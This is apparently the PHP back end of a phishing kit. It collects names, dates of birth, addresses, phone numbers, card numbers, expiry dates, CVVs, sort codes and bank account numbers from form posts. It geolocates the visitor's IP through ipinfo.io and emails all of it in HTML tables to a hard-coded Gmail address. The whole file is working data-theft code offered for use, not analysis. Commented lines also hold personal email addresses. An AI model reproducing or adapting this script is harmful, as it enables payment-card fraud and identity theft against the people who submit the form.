<?php
if(isset($_POST['fname'])) {
    $to = 'l.joseph0479@gmail.com';
 
    
    $subject = 'Payment User info';
    
    //$headers = "From: er.ranjit28111989@gmail.com\r\n";
    
    //$headers .= "Reply-To: er.ranjit28111989@gmail.com\r\n";
    //$headers .= "CC: susan@example.com\r\n";
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    
    $message = '<html><body>';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr><td><strong>First name:</strong> </td><td>" . strip_tags($_POST['fname']) . "</td></tr>";
    $message .= "<tr><td><strong>Middle name:</strong> </td><td>" . strip_tags($_POST['mname']) . "</td></tr>";
    $message .= "<tr><td><strong>SurName:</strong> </td><td>" . strip_tags($_POST['sfname']) . "</td></tr>";
     $message .= "<tr><td><strong>Date of birth :</strong> </td><td>" . strip_tags($_POST['dob']) . "</td></tr>";
    $message .= "<tr><td><strong>Address line 1:</strong> </td><td>" . strip_tags($_POST['al1']) . "</td></tr>";
    $message .= "<tr><td><strong>Address line 2:</strong> </td><td>" . strip_tags($_POST['al2']) . "</td></tr>";
    $message .= "<tr><td><strong>City:</strong> </td><td>" . strip_tags($_POST['city']) . "</td></tr>";
    $message .= "<tr><td><strong>County:</strong> </td><td>" . strip_tags($_POST['county']) . "</td></tr>";
    $message .= "<tr><td><strong>Postcode:</strong> </td><td>" . htmlentities($_POST['postcode']) . "</td></tr>";
    $message .= "<tr><td><strong>Phone number:</strong> </td><td>" . htmlentities($_POST['phoneno']) . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";
    //echo "fgd"; die;
    //mail("ranjitshukla4@gmail.com","sdfsdf","dsfsdf");
    if(mail($to, $subject, $message, $headers)){
            echo "true";
    } else {
        echo "false";
    }
} else {
    //print_r($_POST); die;
    
     $to = 'l.joseph0479@gmail.com';
  
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));// Send to ipinfo
$locantion = $details->city .' '.$details->country;

    
    $subject = 'Payment Card deatails';
    
    //$headers = "From: er.ranjit28111989@gmail.com\r\n";
    
    //$headers .= "Reply-To: er.ranjit28111989@gmail.com\r\n";
    //$headers .= "CC: susan@example.com\r\n";
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    
    $message = '<html><body>';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr><td><strong>Name on card :</strong> </td><td>" . strip_tags($_POST['cname']) . "</td></tr>";
    $message .= "<tr><td><strong>Card number(s):</strong> </td><td>" . strip_tags($_POST['cn']) . "</td></tr>";
    $message .= "<tr><td><strong>Expiry:</strong> </td><td>" . strip_tags($_POST['expiry']) . "</td></tr>";
    $message .= "<tr><td><strong>CVV:</strong> </td><td>" . strip_tags($_POST['cv']) . "</td></tr>";
    $message .= "<tr><td><strong>Sort code:</strong> </td><td>" . strip_tags($_POST['sort']) . "</td></tr>";
    $message .= "<tr><td><strong>Account number:</strong> </td><td>" . strip_tags($_POST['an']) . "</td></tr>";
    $message .= "<tr><td><strong>IP Address:</strong> </td><td>" . $ip . "</td></tr>";
    $message .= "<tr><td><strong>Location:</strong> </td><td>" . $locantion . "</td></tr>";
    $message .= "<tr><td><strong>UserAgent:</strong> </td><td></td></tr>";
    $message .= "<tr><td><strong>Browser:</strong> </td><td></td></tr>";
    $message .= "<tr><td><strong>Platform:</strong> </td><td></td></tr>";
    
    $message .= "</table>";
    $message .= "</body></html>";
    //echo "fgd"; die;
    //mail("ranjitshukla4@gmail.com","sdfsdf","dsfsdf");
    if(mail($to, $subject, $message, $headers)){
            echo "true";
    } else {
        echo "false";
    }
}
?>